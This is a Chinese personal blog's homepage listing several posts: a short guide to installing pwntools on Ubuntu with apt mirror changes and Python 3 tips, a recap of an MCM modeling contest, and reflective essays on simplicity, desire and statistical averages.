<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="gorgeousdays">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="gorgeousdays">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>gorgeousdays</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">gorgeousdays</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/25/%E5%9C%A8Ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/25/%E5%9C%A8Ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">在Ubuntu下搭建pwn环境</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-02-25 12:20:29 / 修改时间：12:21:36" itemprop="dateCreated datePublished" datetime="2021-02-25T12:20:29+08:00">2021-02-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在Ubuntu20.0.4下安装pwntools</p>
<h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>备份源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources_init.list</span><br></pre></td></tr></table></figure>
<p>更换源 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p>删除上述文件全部内容，添加阿里源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
<p>更新源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>更新软件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
<h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装pip3</span></span><br><span class="line">sudo apt install python3-pip</span><br><span class="line"><span class="comment">#升级pip3</span></span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line"><span class="comment">#安装pythondev</span></span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line">pip3 install setuptools</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><ol>
<li><code>python test.py</code>报错<code>No module named pwn</code>    应采用<code>python3</code></li>
<li>构造<code>payload</code>时采用<code>p64</code>函数在<code>python2</code>下可以通过编译 但<code>python3</code>报错<code>TypeError</code> 使用<code>str()</code>强制转化或者<code>.decode(&quot;Ascii&quot;)</code>均有问题 应采用<code>p64(xxx).decode(&quot;iso-8859-1&quot;)</code></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/16/%E5%A4%A7%E9%81%93%E8%87%B3%E7%AE%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/16/%E5%A4%A7%E9%81%93%E8%87%B3%E7%AE%80/" class="post-title-link" itemprop="url">大道至简</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-02-16 12:21:56" itemprop="dateCreated datePublished" datetime="2021-02-16T12:21:56+08:00">2021-02-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-25 12:21:47" itemprop="dateModified" datetime="2021-02-25T12:21:47+08:00">2021-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E7%82%B9%E4%B8%9C%E8%A5%BF/" itemprop="url" rel="index"><span itemprop="name">随便写点东西</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>万物之始，大道至简，衍化为繁。</p>
<p>我想，倒也不只于万物之始，就是现在，大道也依旧至简。</p>
<p>至简不是一种简单，是简明、简约，是能让人忽然洞悉的。或者说，它具有纯粹性，它有一种纯粹的，直观的美。</p>
<p>$E=mc^2,e^{i\pi}+1=0$……物理、数学的公式是至简的，因为它们本就是在探寻世界的基本法则。</p>
<p>人类社会也是至简的，生与死两种状态，但其中所蕴含的却是无限的内容。</p>
<p>宇宙万物更是如此，一个奇点引发爆炸，无尽的法则被高度压缩到一个点，至真至简。宇宙膨胀，大道分散于世界，可根源还是不变，道被分解为各种粒子，在强弱作用力的作用下结合成为各种物质。化与归，本就是一体。</p>
<p>所以，归根到底，还是四个字，大道至简。</p>
<p>那为什么大道是至简的？因为它的纯粹性，它舍弃了所有不必要的”繁复“，只保留了最为“纯粹”的内容。那些揭示规律的公式是经过不断化简得来的，社会的本质是在除去其上繁芜的杂草后所呈现的，宇宙则是在时间的沉淀后将大道化为澄清的。</p>
<p>大道至简，衍化为繁。真理被藏于万物的运行法则中，粒子之间的作用产生了无穷无尽的新事物。衍化使其内容更加丰富，但其本质却变得模糊不清了。</p>
<p>而随着时间的推移，繁又会归于至简。生命的诞生到消亡，即是大道衍变的缩影，新生的事物与外物建立联系，再到一切的消失。将个体投射到整个社会，其实可以发现人生的许多事，简单被化为复杂都是人为的结果啊！</p>
<p>在从整个社会来看，繁杂的一切向着简单的“0”“1”转变，信息的至简大道就是“0”“1”，两个数字代表无数的状态，它存储着过去，也承载着未来。一切故事压缩与“0””1“，万物走向数字化。大道重回至简，可与先前倒也不同。先前是自然的至简法则，而现在在人为的加工后，是人类社会的至简法则。</p>
<p>社会的发展，即是伟大的人们引导自然法则为己用的结果，他们无法直视至简的大道，但基于繁芜的自然大道，他们领悟了自我的至简大道。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/10/%E7%BE%8E%E8%B5%9B%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/10/%E7%BE%8E%E8%B5%9B%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">美赛总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-02-10 21:36:16 / 修改时间：21:38:32" itemprop="dateCreated datePublished" datetime="2021-02-10T21:36:16+08:00">2021-02-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>昨天结束了为期四天的美赛生活，在此写一篇文章，记录一下这几天的生活，做一个小的总结。</p>
<h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2><h3 id="1-25-1-27"><a href="#1-25-1-27" class="headerlink" title="1.25-1.27"></a>1.25-1.27</h3><p>回到家已经是1.25了，本来是想自己好好做一下LaTex的模板，但接下来的安排已经很紧迫了，就在GitHub上找了一个不错的，稍微改一下就拿来用了。接下来几天就是过一遍《机器学习实战》，找一些建模相关的资料。</p>
<h3 id="1-28-1-31"><a href="#1-28-1-31" class="headerlink" title="1.28-1.31"></a>1.28-1.31</h3><p>在家建模整个的状态肯定不如在学校，线上的环境也难以达到线下配合的效果。于是，在这几天我们自己练了2020年美赛的题目。选题阶段，看了一遍，感觉其实也都能写。但我希望这次练习的选择与今年美赛的选择基本一致。今年C题的压缩文件已经提前发了，从其庞大的数据量来看，我们怕是也很难做好。于是，一改我们最为擅长的数据分析题，最后选了E题。当时想，每年的E题都是环境相关，那就专攻这方面吧，只要比赛的E不是非常难就选E。</p>
<p>四天的练习时间，三天写完论文，一天改论文，时间上比国赛宽裕的多。论文写作方面可能提升的不多，但这四天对我整个状态的影响还是比较大的，开始是真不想写论文，毫无动力，写完之后的状态就好很多了，又重新燃起了对建模的那种激情。</p>
<p>这次的联系主要目的还是注重在这次写作过程中发现问题，避免其在比赛期间发生。</p>
<ul>
<li>协助方面，在GitHub上建了个仓库，用git协助的方式还是不错的，没有出现什么问题。</li>
<li>绘图方面，Tableau在练习过程中发挥的作用很大，应该可以作为比赛期间的主要绘图软件使用。</li>
<li>讨论方面，这次发现整个还是缺少讨论，每个人做一点，写一点论文，最后拼凑出来的论文缺少连贯性。讨论的加强、持续的沟通需要在比赛的时候尤其注意。更多的讨论可以避免时间的浪费，线上的协助对其他人的状态都不了解，所以还是需要讨论以及分享来实现自我监督。</li>
<li>时间安排方面，早上8.-11.，下午1.30-5.晚上6.30-10.，时间还是非常充裕的。这次练习浪费的时间其实不少，在比赛期间可以投入更多时间。</li>
</ul>
<h3 id="2-1-2-4"><a href="#2-1-2-4" class="headerlink" title="2.1-2.4"></a>2.1-2.4</h3><p>这几天的主要任务是总结。因为之前写过19年20年的论文，这次就看两年E题的O奖论文，白天看论文，晚上分享总结。写完后会过来看，这个看论文的阶段对我们写作的帮助非常之大，并非论文写作的水平有所提供，而是对优秀论文应该具备哪些要素有了认知。最后我们将以下几点记录在<a target="_blank" rel="noopener" href="https://github.com/gorgeousdays/MCM-Note">MCM-Note</a>中，作为比赛的参考。</p>
<ul>
<li>记录一些易犯的错误,一些重要的点。在比赛期间可以注意。</li>
<li>整理数据网站。写论文需要看大量的论文，美赛也需要自己找数据。之前积累了不少数据网站，现在主要是对它们的内容进行整理，以便在比赛时可以更快找到需要的资源。</li>
<li>修改论文模板，在看了优秀论文后，要总体调整论文格式，从论文中也可以借鉴到一些句式。</li>
<li>建模方法的整理。</li>
<li>使用软件的整理。</li>
</ul>
<p>就我们看的几篇O奖论文，论文中的一些流程图都是逻辑清晰且美观的，在这几天我也学习了绘制这类逻辑图、流程图。</p>
<h2 id="比赛期间"><a href="#比赛期间" class="headerlink" title="比赛期间"></a>比赛期间</h2><h3 id="2-5-2-9"><a href="#2-5-2-9" class="headerlink" title="2.5-2.9"></a>2.5-2.9</h3><p>比赛时间</p>
<h4 id="2-5"><a href="#2-5" class="headerlink" title="2.5"></a>2.5</h4><p>第一天上午6.发题目，我们当时直接看E题了，感觉题目还可以，别的题目也没看，就选E题了。之后是找论文找看论文，理解题目，每隔一小时讨论一次。感觉题目是越理解越不懂，food system确实好做，这样的概念网上有很多论文，但因为这个系统太过庞大了，我们很难简单的将其讲清楚。我的想法是再看一点论文，队友那边第一题已经有一些想法了，他们就先往下写了。到下午，我把我搜集的网站上看到一些东西基本都整理完了，从没有一次连着看过这么多论文，还都是英文。我对food system有了一定的理解，但正是因为看的太多，且也不是非常仔细地全部理解，就感觉这题还是很难写。我有很多想法，很多别人的想法，但是很难将其串联在一起形成自己得的想法，再加上这个概念太过庞大，很难将其通过几个公式、几个方面进行阐述，更多还是分析为主。</p>
<p>优化两个方面并与之前的系统对比，然后预测发生时间。由于存在对比，那就先构建一个评价模型，因为存在优化，那就深入讨论两个方面设定优化系数，预测时间那我们就采用时间需序列。</p>
<p>第一天晚上做到了11.多，第一问的模型也做了个大概，当时要我要做两个优化方面的讨论、晚上只做了一个但是太累了也没继续做了，我这边的进度还是稍微慢一点了。</p>
<h4 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h4><p>早上5.多起来写，赶在讨论之前将我这边的工作基本做完。整个上午我就是把第一问全部整合，队友往下推进第二问。下午就一起第二问，但是对收益成本的理解还是定不下来，期间模型也建了不少，但是就是由于food system这个庞大的概念，始终都定不下要用什么模型，最后还是我这边建立一个Benefit-Cost Model，虽然还是存在很多问题，但其他方法也都不太像，这个起码还是可是往下推进了。到晚上，我这边第二问还差一点，队友第三问基本做好，另一位队友将这些模型串联起来。进度还是ok的。</p>
<h4 id="2-7"><a href="#2-7" class="headerlink" title="2.7"></a>2.7</h4><p>上午我完成第二问，第四问队友那边也有思路了。我这边接下来就是做一些流程图，p图，美化图片。在晚上的时候基本的论文已经出来了，也就剩下摘要部分、符号说明等和一些图片要改了。三天差不多写完+一天改论文也是与预期的差不多。晚上我这边基本没任务就早点睡觉了，队友那边负责把论文的语法错误做纠正。</p>
<h4 id="2-8"><a href="#2-8" class="headerlink" title="2.8"></a>2.8</h4><p>上午6.起，把队友昨晚整理的语法错误修正，把参考文献标注到论文，这在讨论之前我基本也都做好了。白天继续改图、改论文、把一些没写的地方写下。每题基本都好了，但是题目之间的模型还缺少一点联系，就没有一个逻辑上的推进性，而我们看的优秀论文在推进上都是很紧密的，白天主要还是为模型建立联系，尤其是第一问，做的时候考虑的还是太少。做了灵敏度分析晚上写摘要改摘要。一起过一遍改一些问题，下来后每个人各自看论文找问题。</p>
<h4 id="2-9"><a href="#2-9" class="headerlink" title="2.9"></a>2.9</h4><p>上午6.30，把昨天找的问题修改一下，大概把文章过一遍。7.30，交论文下班。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次美赛的论文大概是我们这么多篇论文下来最好的一篇了，前期的准备也算比较充足，比赛期间虽然也有不少问题，比如git使用的问题一度导致论文版本错误，又比如在第二问模型上长时间难有进展，但所幸最后做完了，而且做的感觉也还行。</p>
<p>比完国赛后，我想继续去数学建模，但比完美赛后，我觉得我的建模之旅应该到此为止了。不管结果如何，明年应该也是不会再次参加建模了，因为付出的时间代价太大了，校赛、国赛培训、美赛培训。明年再次参加也许也能拿到好的奖，但是花费时间太多了，而且长进确实也不会有今年那么大，在专业能力上的提升也不多。还是希望这次的美赛能有一个比较好的结果吧。</p>
<p>不管咋么说，也是结束了。三个人的比赛，沟通是很重要的，最后感谢一起陪伴的队友，感谢老师的指导，也感谢自己的付出。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/02/%E8%B0%88%E6%AC%B2%E6%9C%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/02/%E8%B0%88%E6%AC%B2%E6%9C%9B/" class="post-title-link" itemprop="url">谈欲望</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-02-02 21:08:47 / 修改时间：21:44:05" itemprop="dateCreated datePublished" datetime="2021-02-02T21:08:47+08:00">2021-02-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E7%82%B9%E4%B8%9C%E8%A5%BF/" itemprop="url" rel="index"><span itemprop="name">随便写点东西</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>什么才是我们真正想要的东西呢？</p>
<p>在年轻的时候，自命不凡的我们想要地位、想要金钱、想要出人头地。当我们过上富裕的生活，摆脱996的日常的时候，便开始追求身体的健康……</p>
<p>可人生哪有十全十美啊，想要的不一定会得到，就算拥有也可能会失去。拥有了富贵却也失去了对生活的享受，有了美好的未来却又花费了宝贵的青春。可就算是完美了呢，就算拥有了一切，我们会知足的认为一切就够了吗？也未必，患得患失，有得有失，而欲望不止。</p>
<p>谈到欲望，就不能不谈满足。因为不满足，所以欲望不止。</p>
<p>在没有实现目标之前，一切都是足够的，可达到了却也不满足于此。原来生活在温饱线下的人会仅仅满足与吃饱穿暖吗？不，他们必然会奔向小康，会有更多的诉求。他们会很不知足，会很贪心，简直就是贪得无厌，会去追求更多。</p>
<p>这就是欲望所带来的，欲望之火生生不息，也正因为此，社会才会发展。社会的前进不是人民的勤劳，是人民的不满足。正是由于这样的“贪心”，每个人才能过得更好。</p>
<p>而当下，佛系思想生长，欲望遭到侵蚀。人们满足了吗？很难说。但确实，他们不追求了，他们随遇而安。欲望与满足脱钩，时代的进步开始停滞。欲望是社会的永动机，当一个人不追求的时候，社会会抛弃他，很难想象当一群人不追求的时候会发生什么，是他们被抛弃还是社会被抛弃。</p>
<p>从这种角度来看欲望，它确实推动了社会的进步。可人民对欲望的追求有需要考虑自我与时代的关系，要用正确的方法。很多人的欲望太强烈了，强到突破了法律的边界，他们为了达成目标不择手段，强抢，掠夺，无所不用其极。于是他们被法律制裁，被时代碾压。掌控不了欲望的人被欲望所掌控。</p>
<p>当一群人开始追求欲望时，社会便有了一种“奋斗”的氛围。在这种奋斗的氛围下，人们很容易忘掉自己到底需要什么，贫穷到富裕，失去到拥有，我们在欲望的推动下去找寻、去追求更多，只知道追求的是美好的，确忘了何时是终点，只知前进，永不停止。</p>
<p>在欲望的滚轮下，时代向前推进，有追求到忙到没时间停下来看看自己到底走到哪了，有没有超过自己最初界定的目标，超过了多少。</p>
<p>为什么有时候什么都有了却还在追求，却还有欲望，却还在抱怨拥有太少，到底是为什么呢？</p>
<p>也许这只是一种感觉，当我们拥有了追求的东西，这种感觉便会失去。而欲望则是点燃这种感觉的火把。也就是为了这种感觉，人们不断向前追求。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/27/%E8%B0%88%E5%B9%B3%E5%9D%87/" class="post-title-link" itemprop="url">谈平均</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-27 21:41:14" itemprop="dateCreated datePublished" datetime="2021-01-27T21:41:14+08:00">2021-01-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-02-02 21:10:22" itemprop="dateModified" datetime="2021-02-02T21:10:22+08:00">2021-02-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E7%82%B9%E4%B8%9C%E8%A5%BF/" itemprop="url" rel="index"><span itemprop="name">随便写点东西</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​         在网上常看到这样一个段子“我、马云、马化腾、王健林资产平均几百亿”。</p>
<p>​         想想还是挺激动的，“我”一个普通人倒也混进这个平均几百亿的圈子里。可其实，有“我”没“我”倒也一样。单就资产而言，“我”可连他们的零头都没有，显然这“我”是被平均了。</p>
<p>​         生活中倒也不乏这样的事情，大多数的人都被平均过。比如全省人均工资多少，全国人均绿化面积多少。少数的高收入的人群平均了大多数低收入的人群，东部的绿化面积平均了西部。人均的绿化面积在西部想是体会不到，但在东部地区却又溢出了。</p>
<p>​        一些公司打广告往往也如此，平均月薪多高多高，可进去之后才发现，几个高管月薪上万，而普通的员工却也只有几千，平均月薪确实高，可都是享受不到的。</p>
<p>​        为什么经常会有平均这个概念呢？为什么很多新闻、报纸都拿平均说事呢？</p>
<p>​        好像有过这样一个段子，“伊万科夫，你为什么要读真理报？”“我读真理报知道我是幸福的。”同样，平均的高水平使低水平的人或者地区充满向往，仿佛自己也将达到这一水平。大多数被平均了，生活水平被抬高了，整个社会也将更幸福了。那些被平的人呢也无法诉苦，鲜明的数据不给人们机会辩驳，大家都实现了，为什么你没有呢？那人们还是得自己找原因啊。自己不努力还是不会谋划，想是总能找到原因。</p>
